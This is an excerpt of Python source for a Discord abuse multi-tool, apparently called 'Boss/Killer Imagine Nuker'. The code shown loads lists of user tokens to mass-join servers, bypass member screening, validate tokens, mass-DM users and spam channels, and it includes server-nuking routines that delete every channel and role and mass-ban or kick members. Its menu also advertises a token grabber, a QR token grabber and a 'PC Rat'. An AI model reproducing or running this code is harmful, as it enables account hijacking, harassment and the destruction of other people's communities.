    ...
    if choice == '1':
        ...
        def join(invite, token):
            ...
            headers = {
                ...
                "0",
                "cookie":
                f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin":
                "https://discord.com",
                'referer':
                ...
                "same-origin",
                "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                ...
                "bugReporterEnabled",
                "x-super-properties":
                ""
            }
            rrr = requests.post("https://discord.com/api/v9/invites/" + invite,
                                headers=headers)
        ...
        b = input(
            '[\x1b[95m>\x1b[95m\x1B[37m] Do you want to bypass member screening y/n?: '
        )
        ...
        if b == '.':
            ...
            tokens = open('tokens.txt', 'r').read().splitlines()
            for token in tokens:
                threading.Thread(target=bpss,
                                 args=(invite, serverId, token)).start()
...
#   TOKEN CHECKER
    if choice == '3':
        ...
        def success(text):
            lock.acquire()
            print(
                f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"
            )
            lock.release()
        ...
        def invalid(text):
            lock.acquire()
            print(
                f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"
            )
            lock.release()
        ...
        def check_token(token: str):
            response = requests.get(
                ...
                headers={
                    ...
                    "referer":
                    "https://discord.com/channels/967617613960187974/981260247807168532",
                    "sec-fetch-dest":
                    "empty",
                    "sec-fetch-mode":
                    "cors",
                    ...
                    "en-US",
                    "x-super-properties":
                    ""
                },
                timeout=5)
        ...
        def check_tokens():
            ...
            for token in tokens:
                try:
                    threads.append(
                        threading.Thread(target=check_token, args=(token, )))
...
#   SERVER MASSDM
    if choice == '6':
        ...
        if choic == '1':
            ...
            amountt = int(
                input(
                    '[\x1b[95m>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '
                ))
                ...
                try:
                    for token in tokens:
                        for i in range(realamountt):
                            with open("utilities/QR/massdm_IDs.txt",
                                      "r") as file:
                                allText = file.read()
                            ...
                            r2 = requests.post(
                                f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                headers=header,
                                json=payload)
                            ...
                            if r2.status_code == 429:
                                ...
                                print(
                                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                    str(float(ratelimit['retry_after'])) +
                                    " seconds")
                            ...
                            if r1.status_code == 429:
                                ...
                                print(
                                    f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] DM Sent to: {idd}!"
                                )
                    ...
                    print(
                        f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] Token Got Locked')
                ...
                try:
                    for i in range(amountt):
                        ...
                        if r1.status_code == 429:
                            ...
                            print(
                                f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent DM to: {idd}!"
                            )
                        continue
...
#   ACCOUNT NUKER
    if choice == '7':
        ...
        message_Content = str(
            input(f'[\x1b[95m>\x1b[95m\x1B[37m] MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(
                target=utilities.Plugins.Account_Nuker.GANGNUKER_START,
                args=(token, Server_Name, message_Content)).start()
...
#   SERVER NUKER
    if choice == '8':
        ...
        if choicee1 == '1':
            ...
            if choicr == '1':
                ...
                headerrs = {
                    ...
                    'bugReporterEnabled',
                    'x - super - properties':
                    ' =='
                }
                ...
                class UNuker:
                    ...
                    def DeleteChannels(self, guild, channel):
                        while True:
                            r = requests.delete(
                                f"https://discord.com/api/v9/channels/{channel}",
                                headers=headerrs)
                    ...
                    def DeleteRoles(self, guild, role):
                        while True:
                            r = requests.delete(
                                f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                headers=headerrs)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                    ...
                    def SpamChannels(self, guild, name):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created Channel "
                                    )
                                    break
                                else:
                                    print(
                                        f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] You Cant Create Channels'
                                    )
                    ...
                    def SpamRoles(self, guild, name):
                        while True:
                            ...
                            if 'retry_after' in r.text:
                                ...
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created Role "
                                    )
                                    break
                                else:
                                    print(
                                        f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] You Cant Create Roles'
                                    )
                                    break

                    async def NukeStart(self):
                        chh = input(
                            f"[\x1b[95m>\x1b[95m\x1B[37m] Channel Name: ")
                        cha = input(
                            f"[\x1b[95m>\x1b[95m\x1B[37m] Channel Amount: ")
                        rn = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Roles Name: ")
                        ra = input(
                            f"[\x1b[95m>\x1b[95m\x1B[37m] Roles Amount: ")
                        ...
                        for role in roles:
                            threading.Thread(target=self.DeleteRoles,
                                             args=(
                                                 server,
                                                 role,
                                             )).start()
                        ...
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles,
                                             args=(
                                                 server,
                                                 rn,
                                             )).start()
            ...
            if choicr == '2':
                ...
                class MassBan:
                    ...
                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(
                                f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",
                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Banning {member}"
                                    )
                                    break
                                else:
                                    break
                    ...
                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(
                                f"https://discord.com/api/v9/guilds/{guild}/members/{member}",
                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(
                                        f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Kicking {member}'
                                    )
                                    break
                                else:
                                    break
                    ...
                    async def Scrape(self):
                        guild = input(
                            f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
                        await client.wait_until_ready()
                    ...
                    async def BanExecute(self):
                        ...
                        for member in members:
                            threading.Thread(target=self.BanMembers,
                                             args=(
                                                 guild,
                                                 member,
                                             )).start()
                    ...
                    async def KickExecute(self):
                        ...
                        members = open('utilities/QR/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers,
                                             args=(
                                                 guild,
                                                 member,
                                             )).start()
                    ...
                    async def Menu(self):
                        ...
                        choice = input(
                            f'[\x1b[95m>\x1b[95m\x1B[37m] Choice?: ')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input(
                                '[\x1b[95m>\x1b[95m\x1B[37m] MassBAN y/n?: '
                            ).lower()
                            if sure == 'n':
                            ...
                            time.sleep(3)
                            sure = input(
                                '[\x1b[95m>\x1b[95m\x1B[37m] MassKick y/n?: '
                            ).lower()
                            if sure == 'y':
                    ...
                    def Startup(self):
                        try:
                            ...
                            print(
                                f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Invalid Token...'
                            )
                            time.sleep(2)
                            exit = input(
                                '[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        ...
        if choicee1 == '2':
            ...
            if choicee == '1':
                chanless = input(
                    '[\x1b[95m>\x1b[95m\x1B[37m] Spam Channel Name?: ')
                spam = input('[\x1b[95m>\x1b[95m\x1B[37m] Message?: ')
                print(
                    f'{Fore.LIGHTMAGENTA_EX}Type: $Checkmate In Chat To Nuke The Server {Fore.RESET}'
                )
                client = commands.Bot(command_prefix="$")
                ...
                async def Checkmate(ctx):
                    ...
                    for role in guild.roles:
                        try:
                            await role.delete()
                            print(
                                f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {role.name} Has Been Deleted'
                            )
                        except:
                            print(
                                f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] {role.name} Has Not Been Deleted'
                            )
                    ...
                    for channel in guild.channels:
                        try:
                            ...
                            print(
                                f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {channel.name} Has Been Deleted'
                            )
                        except:
                            print(
                                f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] You Cant Delete: {channel}'
                            )
                    ...
                    try:
                        for i in range(MAX_CHANNELS):
                            ...
                            print(
                                f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {chanless} Has Been Created!'
                            )
                    except:
                        print(
                            f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] You havent got permission to create channels'
                        )
                ...
                async def on_guild_channel_create(channel):
                    while True:
                        try:
                            ...
                            print(
                                f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Spamming Server'
                            )

                        except:
                            print(
                                f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Spamming Cancelled'
                            )
            ...
            if choicee == '2':
                print(
                    f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Type {Fore.LIGHTGREEN_EX}$massban{Fore.RESET} in chat to Massban...'
                )
                ...
                async def massban(ctx):
                    ...
                    for i in range(3):
                        for member in list(ctx.guild.members):
                            threading.Thread(target=mass_ban,
                                             args=(member.id, )).start()
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
...
#   SPAMMER
    if choice == '9':
        ...
        delay = float(input(f'[\x1b[95m>\x1b[95m\x1B[37m] Delay: '))
        ch = input(
            '[\x1b[95m>\x1b[95m\x1B[37m] Random Strings: y/n?: ').lower()
        ...
        def spam(token, mess):
            ...
            while True:
                ...
                if src.status_code == 429:
                    ...
                    print(
                        f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Token Doesnt Have Perms For This Channel!'
                    )
...
#   DM SPAMMER (NEED TO FIX!)
    if choice == '10':
        ...
        tokens = open("tokens.txt", "r").read().splitlines()
        print(
            f"{Fore.RED}[!]{Fore.RESET} Make Sure You Have Put Tokens In 'token.txt' Before Using DM Spammer!"
        )
        ...
        chrr = input(
            '[\x1b[95m>\x1b[95m\x1B[37m] Do you want append random string: y/n?: '
        ).lower()

        def thread():
            for token in tokens:
                time.sleep(delay)
                threading.Thread(target=DMSpammer,
                                 args=(user, message, token)).start()
        ...
        def friender(token, user):
            try:
                ...
                if src.status_code == 204:
                    print(
                        f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Friend Request Sent to {user[0]}#{user[1]}! "
                    )
            except Exception as e:
                print(e)
...
#   REACTION SPAMMER
    if choice == '13':
        ...
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=reaction,
                             args=(chd, iddd, emoji, token)).start()
...
#   NICKNAME CHANGER
    if choice == '14':
        ...
        def changenick(server, nickname, token):
            ...
            r = requests.patch(
                f"https://discord.com/api/v9/guilds/{server}/members/@me/nick",
                headers=headers,
                json={"nick": nickname})
            ...
            if r.status_code != 200:
                print(
                    f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Cant Change Nickname... {Fore.RESET}'
                )
        ...
        for token in tokens:
            threading.Thread(target=changenick,
                             args=(server, nick, token)).start()
    ...
    if choice == '18':
        ...
        if changg == '1':
            ...
            def abouttt(token, abbb):
                try:
                    ...
                    rd = requests.patch('https://discord.com/api/v9/users/@me',
                                        headers=headers,
                                        json={'bio': abbb})
        ...
        if changg == '2':
            ...
            def activity(token, act):
                ...
                print(
                    f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Activity Status: {act}'
                )
    ...
    if choice == '22':
        ...
        for i in range(manygr):
            try:
                ...
                time.sleep(0.5)
                r1 = requests.patch(
                    f'https://discord.com/api/v9/channels/{groupID}',
                    headers=headers,
                    json={'name': group})
                ...
                print(
                    f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] RateLimited for {jsr["retry_after"]} seconds'
                ), time.sleep(jsr['retry_after'])

            scrIds = random.choice(open('utilities/QR/groups.txt').readlines())
            grID = scrIds.strip('\n')
            r2 = requests.put(
                f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                headers={'Authorization': token})
            if r2.status_code == 204:
                print(
                    f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Group Members: {UserID}'
                )
...
#   DM DELETER
    if choice == '24':
        ...
        if not channelIds:
            print(
                f"[\x1b[95m>\x1b[95m\x1B[37m] This Token Has 0 Dms to Delete!")
            sleep(2)
            spammer()
        for channel in [
                channelIds[i:i + 3] for i in range(0, len(channelIds), 3)
        ]:
            t = threading.Thread(target=utilities.Plugins.DM_Deleter.DmDeleter,
                                 args=(token, channel))
            t.start()
            processes.append(t)
...
#   TOKEN GENERATOR
    if choice == '25':
        ...
        os.system('cls')
        print(f'''
{Fore.RED}[!]{Fore.RESET} {Fore.WHITE}DM 𝐄𝐆 •₳Đł₮Ɏ₳ ™#6021 For A Paid Token Generator...{Fore.RESET}

{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Start Generating Tokens?
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Exit
''')
...
#   NITRO GENERATOR
    if choice == '26':
        ...
        amount = int(
            input("[\x1b[95m>\x1b[95m\x1B[37m] Amount of Nitro Codes?: "))
        for i in range(amount):
            ...
            count += 1
            print(
                f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Generated Nitro | [ {count} ]')
...
#   PFP CHANGER
    if choice == '29':
        ...
        if optionsforpfp == 1:
            ...
            payload1 = {'avatar': f'data:image/png;base64,{imageurl1}'}

        elif optionsforpfp == 2:
            path = input(
                '[\x1b[95m>\x1b[95m\x1B[37m] Directory For All The Images?: ')
            path.replace(r'\\', '\\\\')
            ...
            payload2 = {'avatar': f'data:image/png;base64,{imageurl2}'}
...
#   ABOUT
    if choice == '30':
        Spinner()
        Write.Print(
            "Hello, thanks for using Boss/Killer Imagine Nuker!\nif you run into any problems make sure to let me know asap!\nAnd Join our links:\n Discord Server >> https://discord.gg/comming-soon\nWebsite >> https://commingsoon.net\nGithub >> https://github.com/Aditya-op\nReplite >> https://replit/aditya-op\nDiscord Id >> 𝕋ℤ𝕏么₳Đł₮Ɏ₳ ™#9073\nJoin This Links if u need any help or if u find any trouble\n\n",
            Colors.purple_to_blue,
            interval=0.015)
...
#   THREADS
    if choice == '31':
        ...
        try:
            ...
            print(
                f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] | Invalid Amount!')
            sleep(1.5)
            spammer()
        if amount >= 40:
            print(
                f"[{Fore.RED}ERROR{Fore.RESET}] | Having {Fore.RED}{amount}{Fore.RESET} Will Cause Ratelimited! Try Something Lower..."
            )
            sleep(4)
            spammer()
        elif amount >= 15:
            print(
                f"[\x1b[95m>\x1b[95m\x1B[37m] Having More Than 15 Threads Can Cause Lag and Ratelimit... [{Fore.RED}{amount}{Fore.RESET}]\nContinue With High Thread?"
            )
...
#   WORKING COMMANDS
    if choice == '33':
        Spinner()
        Write.Print(
            "[1] Server Joiner [Working]\n[2] Server Leaver [Working]\n[3] Token Checker [Working]\n[4] Token Onliner [Working]\n[5] Token Grabber [Working]\n[6] Server MassDM [Working]\n[7] Account Nuker [Working]\n[8] Server Nuker [Working]\n[9]  Channel Spammer [Working]\n[10] DM Spammer [Working]\n[11] Friend Spammer [Working]\n[12] HypeSquad Joiner [Working]\n[13] Reaction Spammer [Working]\n[14] NickName Changer [Working]\n[15] Webhook Spammer [Working]\n[16] VC Spammer [Working]\n[17] PC Rat [Working]\n[18] About Activity [Working]\n[19] Server Lookup [Working]\n[20] Token Infomation [Working]\n[21] Status Changer [Working]\n[22] Group Spammer [Working]\n[23] Auto Login [Working]\n[24] DM Deleter [Working]\n[25] Token Generator [Working]\n[26] Nitro Generator [Working]\n[27] QR Token Grabber [Working]\n[28] Member ID Scraper [Working]\n[29] PFP Changer [Working]\n[30] About [Working]\n[31] THREADS [Working]\n[32] EXIT [Working]\nTotal Commands Working [33/33]\n\n",
            Colors.red_to_blue,
            interval=0.015)
